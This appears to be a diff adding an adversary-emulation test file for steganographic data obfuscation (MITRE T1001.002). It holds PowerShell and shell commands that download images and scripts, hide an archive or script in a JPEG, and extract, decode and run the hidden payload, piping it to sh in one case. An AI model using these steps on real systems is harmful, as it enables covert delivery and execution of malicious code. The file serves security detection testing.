@@ -1,0 +1,172 @@
+attack_technique: T1001.002
+display_name: "Data Obfuscation via Steganography"
+atomic_tests:
+  - name: Steganographic Tarball Embedding
+    auto_generated_guid: c7921449-8b62-4c4d-8a83-d9281ac0190b
+    description: |
+      This atomic test, named "Steganographic Tarball Embedding", simulates the technique of data obfuscation via steganography by embedding a tar archive file (tarball) 
+      within an image.
+      
+      The test begins by ensuring the availability of the image file and the tarball file containing data . It then generates random passwords and saves them to a 
+      file. Subsequently, the tarball file is created, containing the passwords file. The test executor command reads the contents of the image 
+      file and the tarball file as byte arrays and appends them together to form a new image file. This process effectively embeds the tarball 
+      file within the image, utilizing steganography techniques for data obfuscation.
+      
+      This atomic test simulates the technique of data obfuscation via steganography, enabling attackers to clandestinely transfer files across systems undetected. 
+      By embedding the tarball file within the image, adversaries can obscure their activities, facilitating covert communication and data exfiltration.
+    supported_platforms:
+      - windows
+    input_arguments:
+      image_file:
+        description: Image file which will be downloaded to be used to hide data
+        type: path
+        default: PathToAtomicsFolder\T1001.002\bin\T1001.002.jpg
+      tar_file:
+        description: Tarz file containing random passwords
+        type: path
+        default: $env:PUBLIC\Downloads\T1001.002.tarz
+      new_image_file:
+        description: new image file ready for extraction
+        type: path
+        default: $env:PUBLIC\Downloads\T1001.002New.jpg
+      passwords_file:
+        description: Text file containing random passwords
+        type: path
+        default: $env:TEMP\random_passwords.txt
+    dependency_executor_name: powershell
+    dependencies:
+    - description: |
+        Image file must exist
+      prereq_command: |
+        if (!(Test-Path "#{image_file}")) {exit 1} else {
+        {exit 0}
+        }
+      get_prereq_command: |
+        New-Item -Type Directory (split-path "#{image_file}") -ErrorAction ignore | Out-Null
+        Write-Output "Downloading image file..."
+        $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg"
+        Invoke-WebRequest -Uri $imageUrl -OutFile "#{image_file}"
+    - description: |
+        File to hide within tarz file must exist
+      prereq_command: |
+        if (!(Test-Path "#{passwords_file}")) {exit 1} else {
+        {exit 0}
+        }
+      get_prereq_command: |
+        Write-Output "Generating random passwords and saving to file..."
+        $passwords = 1..10 | ForEach-Object { -join ((1..12) | ForEach-Object { @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z') + @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z') + @('0','1','2','3','4','5','6','7','8','9') + @('!','@','#','$','%','^','&','*','(','(',')','-','=','+','_','[',']','{','}','|',';',';',':',',','<','>','?') | Get-Random }) }
+        $passwords | Out-File -FilePath "#{passwords_file}"    
+    - description: |
+        Tarz file to embed in image must exist 
+      prereq_command: |
+        if (!(Test-Path "#{tar_file}")) {exit 1} else {
+        {exit 0}
+        }
+      get_prereq_command: |  
+        Write-Output "Generating tarz file..."
+        tar -cvf "#{tar_file}" "#{passwords_file}"
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        Get-Content "#{image_file}", "#{tar_file}" -Encoding byte -ReadCount 0 | Set-Content "#{new_image_file}" -Encoding byte
+      cleanup_command: |
+        Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
+        Remove-Item -Path "#{new_image_file}" -Force -ErrorAction Ignore
+
+  
+  - name: Embedded Script in Image Execution via Extract-Invoke-PSImage
+    auto_generated_guid: 04bb8e3d-1670-46ab-a3f1-5cee64da29b6
+    description: |
+      This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. 
+      The PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden 
+      within the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.
+      
+      The test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden 
+      PowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a 
+      separate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.
+
+      In the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This
+      is done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. 
+    supported_platforms:
+      - windows
+    input_arguments:
+      image_file:
+        description: Malicious Image file which will be downloaded
+        type: path
+        default: PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg
+      psimage_script:
+        description: Extract-Invoke-PSImage Script downloaded
+        type: path
+        default: PathToAtomicsFolder\ExternalPayloads\Extract-Invoke-PSImage.ps1
+    dependency_executor_name: powershell
+    dependencies:
+    - description: |
+        Image file must exist
+      prereq_command: |
+        if (!(Test-Path "#{image_file}")) {exit 1} else {
+        {exit 0}
+        }
+      get_prereq_command: |
+        New-Item -Type Directory (split-path "#{image_file}") -ErrorAction Ignore | Out-Null
+        Write-Output "Downloading image file..."
+        $imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
+        Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}
+    - description: |
+        Extract-Invoke-PSImage must exist
+      prereq_command: |
+        if (!(Test-Path "#{psimage_script}")) {exit 1} else {
+        {exit 0}
+        }
+      get_prereq_command: |
+        New-Item -Path "PathToAtomicsFolder\ExternalPayloads\" -ItemType Directory -Force | Out-Null
+        Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
+        $scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
+        Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        cd "PathToAtomicsFolder\ExternalPayloads\"
+        Import-Module .\Extract-Invoke-PSImage.ps1
+        $extractedScript=Extract-Invoke-PSImage -Image "#{image_file}" -Out "$HOME\result.ps1"
+        $scriptContent = Get-Content "$HOME\result.ps1" -Raw
+        $base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])"
+        $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
+        $base64Strings | Set-Content "$HOME\decoded.ps1"
+        $decodedContent = Get-Content "$HOME\decoded.ps1" -Raw
+        $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
+        $textPattern = '^.+'  
+        $textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
+        $scriptPath = "$HOME\textExtraction.ps1"
+        $textMatches -join '' | Set-Content -Path $scriptPath
+        . "$HOME\textExtraction.ps1"
+      cleanup_command: |
+        Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
+        Remove-Item -Path "$HOME\result.ps1" -Force -ErrorAction Ignore 
+        Remove-Item -Path "$HOME\textExtraction.ps1" -Force -ErrorAction Ignore
+        Remove-Item -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore        
+
+  - name: Execute Embedded Script in Image via Steganography
+    auto_generated_guid: 4ff61684-ad91-405c-9fbc-048354ff1d07
+    description: This atomic test demonstrates the execution of an embedded script in an image file using steganography techniques. The script is first encoded in base64 and then embedded within the pixels of the image. The modified image is created, and the script is extracted and executed on the target system.
+    supported_platforms:
+    - linux
+    input_arguments:
+      script:
+        description: Shell Script file to be embedded and executed
+        type: String
+        default: PathToAtomicsFolder/script.sh
+      evil_image:
+        description: The modified image with embedded script
+        type: String
+        default: PathToAtomicsFolder/evil_image.jpg
+      image:
+        description: Image file to be embedded
+        type: String
+        default: PathToAtomicsFolder/image.jpg
+    executor:
+      command: cat "#{script}" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "#{image}" - > "#{evil_image}"; strings "#{evil_image}" | tail -n 1 | base64 -d | sh
+      cleanup_command: rm "#{evil_image}"
+      name: sh
+      elevation_required: false
